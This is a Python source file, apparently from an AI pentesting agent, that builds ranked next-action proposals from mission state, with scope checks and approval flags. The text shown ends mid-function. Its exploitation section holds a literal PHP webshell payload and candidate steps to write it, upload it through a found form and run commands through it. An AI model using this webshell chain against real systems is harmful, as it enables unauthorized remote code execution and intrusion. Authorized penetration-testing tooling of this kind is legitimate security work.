"""
Deterministic next-action planning for mission-aware pentesting.

The planner proposes candidate actions from structured mission state. It does
not execute tools. The agent and permission layer remain responsible for any
actual tool call.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Iterable
from urllib.parse import urlparse

from secops_agent.core.experience import (
    CaseLesson,
    LessonMatchDecision,
    SuggestionSignal,
    _access_satisfies,
    _mission_access_state,
    _normalize_required_access,
    _risk_band,
    aggregate_suggestion_signals,
    evaluate_lesson_match,
    lesson_influence_detail,
    suggestion_learning_detail_for_action,
)
from secops_agent.core.mission import Finding, MissionContext, Service, Target


_MISSING_TOOL_BLOCKS: dict[str, set[str]] = {
    "nmap": {"nmap_scan"},
    "nikto": {"nikto_scan"},
    "sqlmap": {"sql_injection_test"},
    "searchsploit": {"searchsploit", "exploit_info"},
    "whois": {"whois_lookup"},
    "curl": {"http_headers", "tech_detect", "xss_test", "waf_detect"},
    "openssl": {"ssl_check", "ssl_audit"},
    "gobuster": {"dir_brute"},
    "dirb": {"dir_brute"},
    "ffuf": {"ffuf_scan"},
    "nuclei": {"nuclei_scan"},
    "openvpn": {"connect_vpn_config"},
    "traceroute": {"traceroute"},
    "netcat": {"port_check"},
    "nc": {"port_check"},
    "ncat": {"port_check"},
    "dig": {"dns_lookup", "subdomain_enum"},
}
_CORRECTIVE_METHODS = {
    "host_discovery_retry",
    "missing_tool_install",
    "content_discovery_retry",
    "timeout_retry",
    "tool_prerequisite_retry",
}
_ACTION_ARGUMENT_MATCH_KEYS = {
    "target",
    "url",
    "domain",
    "query",
    "cve_id",
    "payload_type",
    "scan_type",
    "ports",
    "method",
    "record_type",
}


@dataclass
class NextAction:
    """A candidate next step derived from known mission state."""

    title: str
    rationale: str
    priority: int = 0
    phase: str = ""
    tool_name: str = ""
    arguments: dict[str, Any] = field(default_factory=dict)
    risk: str = "low"
    requires_approval: bool = False
    method: str = ""
    prerequisites: list[str] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    experience: list[str] = field(default_factory=list)
    experience_details: list[dict[str, Any]] = field(default_factory=list)

    @property
    def key(self) -> str:
        parts = [
            self.tool_name or self.title,
            self.arguments.get("target", ""),
            self.arguments.get("domain", ""),
            self.arguments.get("url", ""),
            self.arguments.get("cve_id", ""),
            self.arguments.get("query", ""),
            self.arguments.get("command", ""),
        ]
        return "|".join(" ".join(str(part).casefold().split()) for part in parts)

    def to_dict(self) -> dict[str, Any]:
        return {
            "title": self.title,
            "rationale": self.rationale,
            "priority": self.priority,
            "phase": self.phase,
            "tool_name": self.tool_name,
            "arguments": dict(self.arguments),
            "risk": self.risk,
            "requires_approval": self.requires_approval,
            "method": self.method,
            "prerequisites": list(self.prerequisites),
            "evidence": list(self.evidence),
            "experience": list(self.experience),
            "experience_details": list(self.experience_details),
        }

    def to_prompt_line(self) -> str:
        tool = f" via `{self.tool_name}`" if self.tool_name else ""
        method = f" [{self.method}]" if self.method else ""
        approval = " approval required" if self.requires_approval else ""
        evidence = f" evidence: {self.evidence[0]}" if self.evidence else ""
        experience = f" reason: {self.experience[0]}" if self.experience else ""
        return (
            f"- [{self.priority}] {self.title}{tool}{method}"
            f" ({self.risk}{approval}): {self.rationale}{evidence}{experience}"
        )


class MissionPlanner:
    """Build ranked candidate actions from structured mission facts."""

    def __init__(
        self,
        max_actions: int = 8,
        lessons: list[CaseLesson] | None = None,
        suggestion_signals: list[SuggestionSignal] | None = None,
        playbooks: list[Any] | None = None,
    ) -> None:
        self.max_actions = max_actions
        self.lessons = list(lessons or [])
        self.suggestion_signals = list(suggestion_signals or [])
        self.playbooks = list(playbooks or [])
        self._learning_audit: list[dict[str, Any]] = []

    def plan(self, mission: MissionContext) -> list[NextAction]:
        self._learning_audit = []
        actions: list[NextAction] = []
        actions.extend(self._scope_actions(mission))
        actions.extend(self._target_actions(mission))
        actions.extend(self._host_actions(mission))
        actions.extend(self._service_actions(mission))
        actions.extend(self._finding_actions(mission))
        actions.extend(self._access_actions(mission))
        actions.extend(self._playbook_actions(mission))
        return self._rank(actions, mission)

    def learning_audit(self) -> list[dict[str, Any]]:
        """Return internal audit entries from the most recent planning pass."""
        return [_copy_audit_entry(entry) for entry in self._learning_audit]

    def record_registry_decision(self, action: NextAction, available: bool) -> None:
        """Annotate learning audit entries after agent-side registry filtering."""
        matched = False
        for entry in self._learning_audit:
            if entry.get("action_key") != action.key:
                continue
            matched = True
            entry["registry_available"] = bool(available)
            if not available:
                entry["status"] = "rejected"
                _append_unique(entry.setdefault("reasons", []), "tool is not registered locally")
                entry["priority_delta"] = 0
        if not matched and not available:
            self._learning_audit.append(_base_audit_entry(
                source_type="action",
                source_id=action.key,
                status="rejected",
                action=action,
                reasons=["tool is not registered locally"],
                registry_available=False,
                proposal_only=_action_is_proposal_only(action),
            ))

    def build_prompt_summary(self, mission: MissionContext) -> str:
        actions = self.plan(mission)
        if not actions:
            return ""
        lines = [
            "## Suggested Next Actions",
            "Candidate actions only; do not execute tools without user intent and permission.",
        ]
        lines.extend(action.to_prompt_line() for action in actions)
        return "\n".join(lines)

    def _scope_actions(self, mission: MissionContext) -> list[NextAction]:
        if mission.targets or mission.scope.in_scope or mission.hosts or mission.services:
            return []
        return [
            NextAction(
                title="Define authorized scope",
                rationale="No in-scope target is recorded yet.",
                priority=100,
                phase="scoping",
                risk="low",
            )
        ]

    def _target_actions(self, mission: MissionContext) -> list[NextAction]:
        actions: list[NextAction] = []
        for target in mission.targets:
            if not target.in_scope or not self._is_allowed(mission, target.value):
                continue
            normalized = self._target_value(target)
            if not normalized:
                continue

            if target.type in {"domain", "url"}:
                domain = self._domain_from_target(normalized)
                if domain:
                    actions.append(NextAction(
                        title=f"Resolve DNS for {domain}",
                        rationale="Map the target to IP addresses before active service enumeration.",
                        priority=82,
                        phase="recon",
                        tool_name="dns_lookup",
                        arguments={"domain": domain, "record_type": "A"},
                        risk="low",
                    ))
                    actions.append(NextAction(
                        title=f"Review WHOIS for {domain}",
                        rationale="Collect passive registration and nameserver context.",
                        priority=68,
                        phase="recon",
                        tool_name="whois_lookup",
                        arguments={"target": domain},
                        risk="low",
                    ))
                    actions.append(NextAction(
                        title=f"Enumerate subdomains for {domain}",
                        rationale="Passive subdomain discovery can reveal additional in-scope assets.",
                        priority=62,
                        phase="recon",
                        tool_name="subdomain_enum",
                        arguments={"domain": domain, "method": "passive"},
                        risk="low",
                    ))
                if target.type == "url":
                    actions.append(NextAction(
                        title=f"Analyze HTTP headers for {normalized}",
                        rationale="Identify security header gaps and exposed server metadata.",
                        priority=74,
                        phase="recon",
                        tool_name="http_headers",
                        arguments={"url": normalized},
                        risk="low",
                    ))
            else:
                actions.append(self._nmap_action(normalized, priority=80))
        return actions

    def _host_actions(self, mission: MissionContext) -> list[NextAction]:
        known_service_hosts = {svc.host for svc in mission.services}
        actions: list[NextAction] = []
        for host in mission.hosts:
            if not self._is_allowed(mission, host.ip):
                continue
            if host.ip not in known_service_hosts and not host.services:
                actions.append(self._nmap_action(host.ip, priority=78))
        return actions

    def _service_actions(self, mission: MissionContext) -> list[NextAction]:
        actions: list[NextAction] = []
        services = list(mission.services)
        for host in mission.hosts:
            services.extend(host.services)

        seen_service_keys: set[str] = set()
        for svc in services:
            if svc.key in seen_service_keys or not self._is_allowed(mission, svc.host):
                continue
            seen_service_keys.add(svc.key)
            name = svc.service.lower()
            version_query = self._service_query(svc)

            if self._is_web_service(svc):
                url = self._service_url(svc)
                actions.extend([
                    NextAction(
                        title=f"Analyze HTTP headers on {url}",
                        rationale="Confirm security headers and server metadata.",
                        priority=76,
                        phase="enumeration",
                        tool_name="http_headers",
                        arguments={"url": url},
                        risk="low",
                    ),
                    NextAction(
                        title=f"Detect web technology on {url}",
                        rationale="Fingerprint web stack before vulnerability validation.",
                        priority=70,
                        phase="enumeration",
                        tool_name="tech_detect",
                        arguments={"url": url},
                        risk="low",
                    ),
                    NextAction(
                        title=f"Discover web content on {url}",
                        rationale="Find interesting paths such as admin panels, backups, or exposed repositories.",
                        priority=66,
                        phase="enumeration",
                        tool_name="dir_brute",
                        arguments={"url": url},
                        risk="medium",
                        requires_approval=True,
                    ),
                    NextAction(
                        title=f"Run web vulnerability scan on {url}",
                        rationale="Check common web server misconfigurations after basic fingerprinting.",
                        priority=58,
                        phase="vulnerability",
                        tool_name="nikto_scan",
                        arguments={"url": url},
                        risk="medium",
                        requires_approval=True,
                    ),
                ])
                if svc.port == 443 or name in {"https", "ssl", "https-alt"}:
                    actions.append(NextAction(
                        title=f"Check TLS certificate for {svc.host}",
                        rationale="Inspect certificate validity and issuer details.",
                        priority=64,
                        phase="enumeration",
                        tool_name="ssl_check",
                        arguments={"domain": svc.host, "port": svc.port},
                        risk="low",
                    ))

            if version_query:
                actions.append(NextAction(
                    title=f"Search known exploit references for {version_query}",
                    rationale="Correlate confirmed service versions with public exploit references.",
                    priority=54,
                    phase="vulnerability",
                    tool_name="searchsploit",
                    arguments={"query": version_query},
                    risk="low",
                ))

            if name in {"ssh", "openssh"} or svc.port == 22:
                actions.append(NextAction(
                    title=f"Review SSH exposure on {svc.host}:{svc.port}",
                    rationale="Check version, authentication policy, and hardening before any auth testing.",
                    priority=52,
                    phase="enumeration",
                    risk="low",
                ))
            if name in {"mysql", "postgresql", "mssql", "oracle"} or svc.port in {3306, 5432, 1433, 1521}:
                actions.append(NextAction(
                    title=f"Assess database exposure on {svc.host}:{svc.port}",
                    rationale="Validate whether the database service should be externally reachable.",
                    priority=50,
                    phase="enumeration",
                    risk="low",
                ))
            if name in {"ftp", "vsftpd", "proftpd"} or svc.port == 21:
                actions.append(NextAction(
                    title=f"Review FTP exposure on {svc.host}:{svc.port}",
                    rationale="Check anonymous access policy and service version before intrusive tests.",
                    priority=50,
                    phase="enumeration",
                    risk="low",
                ))
        return actions

    def _finding_actions(self, mission: MissionContext) -> list[NextAction]:
        actions: list[NextAction] = []
        for finding in mission.findings:
            actions.extend(self._operational_retry_actions(finding))
            actions.extend(self._controlled_exploitation_actions(finding))
            cve = self._extract_cve(finding)
            if cve and finding.category != "cve_reference":
                actions.append(NextAction(
                    title=f"Look up {cve}",
                    rationale="Collect CVE severity and remediation context for a confirmed product/version.",
                    priority=88,
                    phase="vulnerability",
                    tool_name="cve_lookup",
                    arguments={"cve_id": cve},
                    risk="low",
                ))
            if finding.category in {"cve_reference", "exploit_reference"}:
                actions.append(NextAction(
                    title=f"Correlate reference with target evidence: {finding.title[:80]}",
                    rationale="Reference data must be matched to confirmed in-scope product and version before reporting.",
                    priority=48,
                    phase="vulnerability",
                    risk="low",
                ))
                continue
            if finding.severity in {"critical", "high", "medium", "low"}:
                actions.append(NextAction(
                    title=f"Validate finding evidence: {finding.title[:80]}",
                    rationale="Confirm impact, affected target, evidence quality, and remediation before reporting.",
                    priority=84 if finding.severity in {"critical", "high"} else 60,
                    phase="vulnerability",
                    risk="low",
                ))
        return actions

    def _operational_retry_actions(self, finding: Finding) -> list[NextAction]:
        """Build retry candidates from technical tool failures."""
        evidence = self._finding_evidence(finding)
        missing_tool = self._finding_metadata_value(finding, "missing_tool")
        install_command = self._finding_metadata_value(finding, "install_command")
        install_package = self._finding_metadata_value(finding, "install_package") or missing_tool

        if missing_tool and install_command:
            return [
                NextAction(
                    title=f"Install missing local tool: {missing_tool}",
                    rationale=(
                        f"The previous `{finding.tool_used}` attempt could not run because "
                        f"`{missing_tool}` is missing locally."
                    ),
                    priority=96,
                    phase="setup",
                    tool_name="run_shell",
                    arguments={"command": install_command},
                    risk="high",
                    requires_approval=True,
                    method="missing_tool_install",
                    prerequisites=[
                        "Confirm this machine is allowed to install packages.",
                        f"Install package `{install_package}` before retrying `{finding.tool_used}`.",
                    ],
                    evidence=evidence,
                )
            ]

        if finding.category == "scan_host_discovery_failed" and finding.target:
            return [
                NextAction(
                    title=f"Retry Nmap with -Pn for {finding.target}",
                    rationale="A previous Nmap run reported host discovery failure; -Pn skips discovery probes and scans the target directly.",
                    priority=92,
                    phase="enumeration",
                    tool_name="nmap_scan",
                    arguments={
                        "target": finding.target,
                        "scan_type": "version",
                        "ports": "top100",
                        "extra_args": "-Pn",
                    },
                    risk="medium",
                    requires_approval=True,
                    method="host_discovery_retry",
                    evidence=evidence,
                )
            ]

        if finding.category == "tool_timeout" and finding.target:
            if finding.tool_used == "nmap_scan":
                return [
                    NextAction(
                        title=f"Retry Nmap with a bounded profile for {finding.target}",
                        rationale="The previous scan timed out; retry with a smaller service-version profile before expanding scope.",
                        priority=82,
                        phase="enumeration",
                        tool_name="nmap_scan",
                        arguments={
                            "target": finding.target,
                            "scan_type": "version",
                            "ports": "top100",
                        },
                        risk="medium",
                        requires_approval=True,
                        method="timeout_retry",
                        evidence=evidence,
                    )
                ]
            if finding.tool_used == "dir_brute":
                return [
                    NextAction(
                        title=f"Retry content discovery with a bounded profile on {finding.target}",
                        rationale="The previous content discovery attempt timed out; retry with a focused extension-aware pass.",
                        priority=82,
                        phase="enumeration",
                        tool_name="dir_brute",
                        arguments={
                            "url": finding.target,
                            "extensions": "php,txt,bak,html",
                            "threads": 5,
                        },
                        risk="medium",
                        requires_approval=True,
                        method="timeout_retry",
                        evidence=evidence,
                    )
                ]
            if finding.tool_used == "nikto_scan":
                return [
                    NextAction(
                        title=f"Retry Nikto with focused checks on {finding.target}",
                        rationale="The previous Nikto scan timed out; retry with a narrower tuning set before broader checks.",
                        priority=70,
                        phase="vulnerability",
                        tool_name="nikto_scan",
                        arguments={"url": finding.target, "tuning": "123"},
                        risk="medium",
                        requires_approval=True,
                        method="timeout_retry",
                        evidence=evidence,
                    )
                ]
            if finding.tool_used == "sql_injection_test":
                return [
                    NextAction(
                        title=f"Retry SQL injection checks with a low-risk profile on {finding.target}",
                        rationale="The previous sqlmap run timed out; retry with level 1 and risk 1 before expanding tests.",
                        priority=70,
                        phase="vulnerability",
                        tool_name="sql_injection_test",
                        arguments={"url": finding.target, "level": 1, "risk": 1},
                        risk="medium",
                        requires_approval=True,
                        method="timeout_retry",
                        evidence=evidence,
                    )
                ]

        if finding.category == "content_discovery_empty" and finding.target:
            return [
                NextAction(
                    title=f"Retry content discovery with common extensions on {finding.target}",
                    rationale="The first content discovery pass returned no paths; retry with extensions that often reveal lab web files.",
                    priority=74,
                    phase="enumeration",
                    tool_name="dir_brute",
                    arguments={
                        "url": finding.target,
                        "extensions": "php,txt,bak,html",
                        "threads": 10,
                    },
                    risk="medium",
                    requires_approval=True,
                    method="content_discovery_retry",
                    evidence=evidence,
                )
            ]

        if (
            finding.category == "tool_prerequisite_missing"
            and finding.tool_used == "dir_brute"
            and finding.target
        ):
            return [
                NextAction(
                    title=f"Retry content discovery with an available wordlist on {finding.target}",
                    rationale="Directory brute force did not run because the configured wordlist was missing; retry with the tool fallback or a confirmed local wordlist.",
                    priority=72,
                    phase="enumeration",
                    tool_name="dir_brute",
                    arguments={"url": finding.target},
                    risk="medium",
                    requires_approval=True,
                    method="tool_prerequisite_retry",
                    evidence=evidence,
                )
            ]

        return []

    def _controlled_exploitation_actions(self, finding: Finding) -> list[NextAction]:
        """Build bounded exploitation candidates from confirmed evidence."""
        if finding.category in {"cve_reference", "exploit_reference"}:
            return []

        actions: list[NextAction] = []
        text = f"{finding.title} {finding.category} {finding.target} {finding.evidence}".casefold()
        evidence = self._finding_evidence(finding)

        if finding.category == "dir_enum" and self._looks_like_upload_surface(finding):
            target = self._finding_path_target(finding)
            actions.append(NextAction(
                title=f"Assess upload surface at {target}",
                rationale="An upload or panel path was found; validate form behavior and controls before any payload generation.",
                priority=74,
                phase="exploitation",
                risk="high",
                requires_approval=True,
                method="upload_surface_validation",
                prerequisites=[
                    "Confirm the path is in scope and reachable.",
                    "Identify form fields, allowed extensions, and server-side filtering.",
                    "Ask for listener details before generating any reverse-shell payload.",
                ],
                evidence=evidence,
            ))
            # Propose concrete exploitation chain using the new tools
            base_url = self._finding_base_url(finding)
            if base_url:
                actions.append(NextAction(
                    title=f"Create webshell payload for upload to {target}",
                    rationale="Upload form detected; create a minimal PHP webshell to test unrestricted file upload.",
                    priority=70,
                    phase="exploitation",
                    tool_name="write_file",
                    arguments={
                        "path": "shell.php",
                        "content": "<?php system($_GET['cmd']); ?>",
                    },
                    risk="high",
                    requires_approval=True,
                    method="payload_creation",
                    evidence=evidence,
                ))
                actions.append(NextAction(
                    title=f"Upload webshell to {target}",
                    rationale="Upload the created payload via the form to test for unrestricted file upload vulnerability.",
                    priority=68,
                    phase="exploitation",
                    tool_name="http_request",
                    arguments={
                        "url": target,
                        "method": "POST",
                        "upload_file": "shell.php",
                        "upload_field_name": "fileUpload",
                    },
                    risk="high",
                    requires_approval=True,
                    method="file_upload_exploit",
                    evidence=evidence,
                ))
                uploads_url = f"{base_url.rstrip('/')}/uploads/shell.php"
                actions.append(NextAction(
                    title=f"Verify uploaded shell at {uploads_url}",
                    rationale="Check if the uploaded webshell is accessible and executable.",
                    priority=66,
                    phase="exploitation",
                    tool_name="webshell_exec",
                    arguments={
                        "shell_url": uploads_url,
                        "command": "id",
                    },
                    risk="high",
                    requires_approval=True,
                    method="webshell_verification",
                    evidence=evidence,
                ))

        if finding.category == "dir_enum" and self._looks_like_source_disclosure(finding):
            target = self._finding_path_target(finding)
            actions.append(NextAction(
                title=f"Assess source disclosure at {target}",
                rationale="A repository or source-control path was exposed; confirm disclosure impact before any bulk retrieval.",
                priority=78,
                phase="vulnerability",
                risk="high",
                requires_approval=True,
                method="source_disclosure_review",
                prerequisites=[
                    "Confirm the path is in scope and reachable.",
                    "Review minimal proof first, such as repository metadata or directory response.",
                    "Avoid dumping source, secrets, or commit history until the user approves that step.",
                ],
                evidence=evidence,
            ))

        if finding.category == "dir_enum" and self._looks_like_sensitive_file_exposure(finding):
            target = self._finding_path_target(finding)
            actions.append(NextAction(
                title=f"Assess sensitive file exposure at {target}",
                rationale="A backup, config, debug, or environment path was found; classify exposure before retrieving sensitive contents.",
                priority=76,
                phase="vulnerability",
                risk="high",
                requires_approval=True,
                method="sensitive_file_exposure_review",
                prerequisites=[
                    "Confirm the path is in scope and reachable.",
                    "Use a non-destructive request first, such as headers or status confirmation.",
                    "Do not print secrets, credentials, flags, or private data into the transcript without explicit need.",
                ],
                evidence=evidence,
            ))

        if finding.category == "web_vuln" and self._looks_like_directory_listing(finding):
            actions.append(NextAction(
                title=f"Assess directory listing exposure at {finding.target}",
                rationale="Directory indexing was reported; inspect exposure boundaries and remediation before deeper retrieval.",
                priority=64,
                phase="vulnerability",
                risk="medium",
                requires_approval=True,
                method="directory_listing_review",
                prerequisites=[
                    "Confirm the listing is in scope and reachable.",
                    "Capture minimal evidence of listing exposure.",
                    "Avoid downloading bulk content unless the user approves that follow-up.",
                ],
                evidence=evidence,
            ))

        if finding.category == "sqli":
            actions.append(NextAction(
                title=f"Prepare SQL injection validation payloads for {finding.target}",
                rationale="SQL injection evidence exists; generate bounded payload examples only after explicit approval.",
                priority=86,
                phase="exploitation",
                tool_name="generate_payload",
                arguments={"payload_type": "sqli"},
                risk="high",
                requires_approval=True,
                method="payload_generation",
                prerequisites=[
                    "Confirm the injectable parameter and authorization.",
                    "Prefer non-destructive validation before data extraction.",
                ],
                evidence=evidence,
            ))

        if finding.category in {"web_vuln", "xss"} and "xss" in text:
            actions.append(NextAction(
                title=f"Prepare XSS validation payloads for {finding.target}",
                rationale="XSS evidence exists; generate bounded proof payloads before manual browser validation.",
                priority=72,
                phase="exploitation",
                tool_name="generate_payload",
                arguments={"payload_type": "xss"},
                risk="medium",
                requires_approval=True,
                method="payload_generation",
                prerequisites=["Confirm reflected/stored context and avoid credential or session capture."],
                evidence=evidence,
            ))

        if finding.category in {"web_vuln", "rce", "cmd_injection"} and any(
            marker in text for marker in ("command", "cmd", "rce", "remote code", "os command")
        ):
            actions.append(NextAction(
                title=f"Prepare command-injection validation payloads for {finding.target}",
                rationale="Command execution evidence exists; generate bounded validation payloads only after approval.",
                priority=82,
                phase="exploitation",
                tool_name="generate_payload",
                arguments={"payload_type": "cmd_injection"},
                risk="high",
                requires_approval=True,
                method="payload_generation",
                prerequisites=[
                    "Confirm target scope and expected command side effects.",
                    "Use harmless proof commands before any shell workflow.",
                ],
                evidence=evidence,
            ))

        if finding.category == "suid_binary":
            binary = finding.target or self._finding_path_target(finding)
            actions.append(NextAction(
                title=f"Assess SUID privilege escalation candidate {binary}",
                rationale="An unusual SUID binary was observed; map it to a safe validation path before attempting escalation.",
                priority=80,
                phase="exploitation",
                risk="high",
                requires_approval=True,
                method="suid_privilege_escalation_review",
                prerequisites=[
                    "Confirm an interactive shell exists on the target.",
                    "Identify binary version and GTFOBins-style technique manually.",
                    "Validate impact with a harmless command before reading protected files.",
                ],
                evidence=evidence,
            ))

        if finding.category == "known_vuln" and finding.severity in {"critical", "high"}:
            actions.append(NextAction(
                title=f"Assess controlled exploit feasibility for {finding.title[:80]}",
                rationale="A high-impact vulnerability is supported by target evidence; review prerequisites before exploitation.",
                priority=78,
                phase="exploitation",
                risk="high",
                requires_approval=True,
                method="exploit_feasibility_review",
                prerequisites=[
                    "Correlate the exploit path to the confirmed product and version.",
                    "Define a reversible proof-of-concept and stop condition.",
                    "Confirm explicit approval for the exploitation step.",
                ],
                evidence=evidence,
            ))

        return actions

    def _access_actions(self, mission: MissionContext) -> list[NextAction]:
        if not mission.credentials and not any(h.access_level != "none" for h in mission.hosts):
            return []
        return [
            NextAction(
                title="Preserve access evidence and assess impact",
                rationale="Credentials or host access are recorded; document proof and business impact.",
                priority=90,
                phase="post_exploitation",
                risk="low",
            )
        ]

    def _playbook_actions(self, mission: MissionContext) -> list[NextAction]:
        actions: list[NextAction] = []
        for playbook in self.playbooks:
            evidence_audit = self._playbook_evidence_audit(playbook, mission)
            if evidence_audit["reasons"]:
                self._learning_audit.append(_base_audit_entry(
                    source_type="playbook",
                    source_id=str(getattr(playbook, "id", "") or getattr(playbook, "source_lesson_id", "") or ""),
                    status="rejected",
                    action=None,
                    reasons=evidence_audit["reasons"],
                    why_matches=evidence_audit["why_matches"],
                    missing_evidence=evidence_audit["missing_evidence"],
                    service_match=evidence_audit["service_match"],
                    endpoint_match=evidence_audit["endpoint_match"],
                    risk_match=evidence_audit["risk_match"],
                    access_match=evidence_audit["access_match"],
                    required_access=evidence_audit["required_access"],
                    current_access=evidence_audit["current_access"],
                    proposal_only=True,
                ))
                continue
            try:
                action = playbook.to_next_action(priority=69)
            except AttributeError:
                self._learning_audit.append(_base_audit_entry(
                    source_type="playbook",
                    source_id=str(getattr(playbook, "id", "") or getattr(playbook, "source_lesson_id", "") or ""),
                    status="rejected",
                    action=None,
                    reasons=["playbook cannot be converted to a next action"],
                    risk_match=evidence_audit["risk_match"],
                    access_match=evidence_audit["access_match"],
                    required_access=evidence_audit["required_access"],
                    current_access=evidence_audit["current_access"],
                    proposal_only=True,
                ))
                continue
            if not action.tool_name:
                self._learning_audit.append(_base_audit_entry(
                    source_type="playbook",
                    source_id=str(getattr(playbook, "id", "") or getattr(playbook, "source_lesson_id", "") or ""),
                    status="rejected",
                    action=action,
                    reasons=["playbook action has no tool"],
                    risk_match=evidence_audit["risk_match"],
                    access_match=evidence_audit["access_match"],
                    required_access=evidence_audit["required_access"],
                    current_access=evidence_audit["current_access"],
                    proposal_only=True,
                ))
                continue
            if not self._action_arguments_allowed(mission, action):
                self._learning_audit.append(_base_audit_entry(
                    source_type="playbook",
                    source_id=str(getattr(playbook, "id", "") or getattr(playbook, "source_lesson_id", "") or ""),
                    status="rejected",
                    action=action,
                    reasons=["playbook action target is out of scope"],
                    why_matches=evidence_audit["why_matches"],
                    missing_evidence=evidence_audit["missing_evidence"],
                    service_match=evidence_audit["service_match"],
                    endpoint_match=evidence_audit["endpoint_match"],
                    risk_match=evidence_audit["risk_match"],
                    access_match=evidence_audit["access_match"],
                    required_access=evidence_audit["required_access"],
                    current_access=evidence_audit["current_access"],
                    scope_allowed=False,
                    proposal_only=True,
                ))
                continue
            self._learning_audit.append(_base_audit_entry(
                source_type="playbook",
                source_id=str(getattr(playbook, "id", "") or getattr(playbook, "source_lesson_id", "") or ""),
                status="applied",
                action=action,
                reasons=["playbook passed evidence and scope gates"],
                why_matches=evidence_audit["why_matches"],
                missing_evidence=["user approval still required"],
                service_match=evidence_audit["service_match"],
                endpoint_match=evidence_audit["endpoint_match"],
                risk_match=evidence_audit["risk_match"],
                access_match=evidence_audit["access_match"],
                required_access=evidence_audit["required_access"],
                current_access=evidence_audit["current_access"],
                scope_allowed=True,
                proposal_only=True,
                effect="playbook-proposal",
            ))
            actions.append(action)
        return actions

    def _rank(self, actions: list[NextAction], mission: MissionContext) -> list[NextAction]:
        deduped: dict[str, NextAction] = {}
        blocked_tools = self._blocked_tool_names(mission)
        for action in actions:
            if action.tool_name in blocked_tools and action.method != "missing_tool_install":
                self._mark_action_audit_rejected(
                    action,
                    "tool blocked by current missing local dependency",
                    registry_available=False,
                )
                continue
            if self._suppressed_by_current_session_failure(action, mission):
                self._mark_action_audit_rejected(
                    action,
                    "suppressed because the same action failed in this session",
                )
                continue
            self._apply_experience(action, mission)
            if self._apply_signal_learning(action):
                self._mark_action_audit_rejected(
                    action,
                    "suppressed by signal learning (repeatedly ignored)",
                )
                continue
            existing = deduped.get(action.key)
            if existing is None or action.priority > existing.priority:
                deduped[action.key] = action
        return sorted(deduped.values(), key=lambda item: item.priority, reverse=True)[: self.max_actions]

    def _apply_experience(self, action: NextAction, mission: MissionContext) -> None:
        if not self.lessons:
            return
        before_priority = action.priority
        decisions = [
            evaluate_lesson_match(lesson, mission, action, min_score=0.18)
            for lesson in self.lessons
        ]
        matches = sorted(
            [decision for decision in decisions if decision.can_influence],
            key=lambda item: item.score or 0.0,
            reverse=True,
        )[:3]
        selected_ids = {decision.lesson.id for decision in matches}
        for lesson in self.lessons:
            decision = next(item for item in decisions if item.lesson.id == lesson.id)
            self._learning_audit.append(
                self._lesson_audit_entry(
                    action,
                    decision,
                    selected=lesson.id in selected_ids,
                )
            )
        if not matches:
            return
        notes: list[str] = []
        for decision in matches:
            lesson = decision.lesson
            score = decision.score or 0.0
            if decision.status == "applied":
                delta = max(2, round(score * 20))
                if decision.effect == "boost":
                    action.priority += delta
                else:
                    action.priority -= delta
            notes.append(lesson.reason())
            detail = lesson_influence_detail(lesson, mission, action)
            if detail not in action.experience_details:
                action.experience_details.append(detail)
        for note in notes:
            if note not in action.experience:
                action.experience.append(note)
        self._set_action_audit_priority_delta(action, action.priority - before_priority)

    def _apply_signal_learning(self, action: NextAction) -> bool:
        """Apply signal-based learning adjustments.

        Returns True if the action should be **suppressed** (hidden from the
        user) because it has been repeatedly ignored.
        """
        if not self.suggestion_signals:
            return False
        detail = suggestion_learning_detail_for_action(self.suggestion_signals, action)
        if not detail:
            return False
        delta = int(detail.get("priority_delta") or 0)
        if delta:
            action.priority += delta
        reason = str(detail.get("reason") or "")
        note = f"suggestion learning: {reason}" if reason else "suggestion learning signal"
        if note not in action.experience:
            action.experience.append(note)
        if detail not in action.experience_details:
            action.experience_details.append(detail)

        # Bug 2.2: check suppression via signal counts.
        signal_counts = detail.get("signal_counts")
        if isinstance(signal_counts, dict):
            ignored = int(signal_counts.get("ignored", 0))
            selected = int(signal_counts.get("selected", 0))
            succeeded = int(signal_counts.get("succeeded", 0))
            key_lower = str(signal_counts.get("key", "")).casefold()
            if selected == 0 and succeeded == 0:
                if ("install" in key_lower and ignored >= 3) or \
                   ("scope_define" in key_lower and ignored >= 1) or \
                   (ignored >= 5):
                    return True
        return False

    def _nmap_action(self, target: str, priority: int) -> NextAction:
        return NextAction(
            title=f"Enumerate services on {target}",
            rationale="Identify open ports and service versions before vulnerability testing.",
            priority=priority,
            phase="enumeration",
            tool_name="nmap_scan",
            arguments={"target": target, "scan_type": "version", "ports": "top100"},
            risk="medium",
            requires_approval=True,
        )

    def _is_allowed(self, mission: MissionContext, value: str) -> bool:
        return bool(value) and mission.scope.is_in_scope(value)

    def _action_arguments_allowed(self, mission: MissionContext, action: NextAction) -> bool:
        checked = False
        for key in ("target", "url", "domain"):
            value = str((action.arguments or {}).get(key) or "").strip()
            if not value:
                continue
            checked = True
            if not self._is_allowed(mission, value):
                return False
        return checked or not action.arguments

    def _playbook_has_current_evidence(self, playbook: Any, mission: MissionContext) -> bool:
        return not self._playbook_evidence_audit(playbook, mission)["reasons"]

    def _playbook_evidence_audit(self, playbook: Any, mission: MissionContext) -> dict[str, Any]:
        reasons: list[str] = []
        why_matches: list[str] = []
        missing_evidence: list[str] = []
        service_match: bool | None = None
        endpoint_match: bool | None = None
        risk_match: bool | None = None
        access_match: bool | None = None
        required_access = _normalize_required_access(getattr(playbook, "required_access", "") or "")
        current_access = _mission_access_state(mission)
        service_fingerprints = list(getattr(playbook, "service_fingerprints", ()) or ())
        endpoint_hints = list(getattr(playbook, "endpoint_hints", ()) or ())
        risk_band = _risk_band(getattr(playbook, "risk_class", "") or "")
        if risk_band:
            risk_match = True
            why_matches.append(f"risk: {risk_band}")
        if service_fingerprints:
            playbook_services = _service_families_from_values(service_fingerprints)
            mission_services = _service_families_from_services(mission)
            if not mission_services:
                service_match = False
                reasons.append("confirm matching service family")
                missing_evidence.append("current service evidence is missing")
            elif playbook_services & mission_services:
                service_match = True
                why_matches.append(f"service: {', '.join(sorted(playbook_services & mission_services)[:3])}")
            else:
                service_match = False
                reasons.append("service family mismatch")
                missing_evidence.append("confirm matching service family")
        if endpoint_hints:
            playbook_paths = _path_hints(endpoint_hints)
            mission_paths = _path_hints(_mission_endpoint_values(mission))
            if not mission_paths:
                endpoint_match = False
                reasons.append("confirm matching endpoint evidence")
                missing_evidence.append("current endpoint evidence is missing")
            elif playbook_paths & mission_paths:
                endpoint_match = True
